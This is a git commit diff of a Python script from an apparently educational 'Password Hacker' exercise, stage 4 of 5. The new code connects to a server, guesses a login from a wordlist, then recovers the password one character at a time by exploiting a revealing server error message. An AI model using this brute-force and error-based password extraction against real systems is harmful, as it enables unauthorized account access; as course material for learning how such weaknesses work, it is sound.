65eeee5229de62b6ec3f46e450a84c73fd1431d5
denys <denamyte@gmail.com>
2023-01-21 04:04:40 +0200

    2023-01-21: Stage 4/5: finished

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -1,40 +1,57 @@
-import itertools
+import json
 import os
-import re
 import socket
 import string
 from sys import argv
-from typing import Iterable
 
+WRONG_PWD_MSG = 'Wrong password!'
+EXCEPTION_MSG = 'Exception happened during login'
 SUCCESS_MSG = 'Connection success!'
+LETTER_FOUND_MSGS = [EXCEPTION_MSG, SUCCESS_MSG]
+LETTERS = string.ascii_letters + string.digits
 
 
-def pick_up(s: socket.socket):
-    for pwd in list_iter():
-        s.send(pwd.encode())
-        if s.recv(100).decode() == SUCCESS_MSG:
-            return pwd
+def get_json(login: str, pwd: str) -> str:
+    return json.dumps({'login': login,
+                       'password': pwd},
+                      indent=4)
 
 
-def word_iter(word: str) -> Iterable[str]:
-    if re.match(r'\d+$', word):
-        return [word]
-    else:
-        return (''.join(prod) for prod in itertools.product(
-                *((sym.lower(), sym.upper()) for sym in word)))
+def send_receive(login: str, pwd: str, s: socket.socket) -> str:
+    data = get_json(login, pwd).encode()
+    s.send(data)
+    raw = s.recv(1024)
+    return json.loads(raw.decode())['result']
 
 
-def list_iter() -> Iterable[str]:
-    with open(os.path.join(os.getcwd(), 'passwords.txt')) as file:
-        lines = file.readlines()
-    return itertools.chain(*(word_iter(word[:-1]) for word in lines))
+def find_login(s: socket.socket) -> str:
+    with open(os.path.join(os.getcwd(), 'logins.txt')) as f:
+        logins = (x[:-1] for x in f.readlines())
+    for login in logins:
+        msg = send_receive(login, ' ', s)
+        if msg == WRONG_PWD_MSG:
+            return login
+
+
+def find_pwd(login: str, s: socket.socket) -> str:
+    pwd, sym, msg = ('' for _ in range(3))
+    while msg != SUCCESS_MSG:
+        for i in range(len(LETTERS)):
+            sym = LETTERS[i]
+            msg = send_receive(login, pwd + sym, s)
+            if msg in LETTER_FOUND_MSGS:
+                break
+        pwd += sym
+    return pwd
 
 
 def main():
     ip, port, = argv[1], int(argv[2])
     with socket.socket() as s:
         s.connect((ip, port))
-        print(pick_up(s))
+        login = find_login(s)
+        pwd = find_pwd(login, s)
+        print(get_json(login, pwd))
 
 
 if __name__ == '__main__':
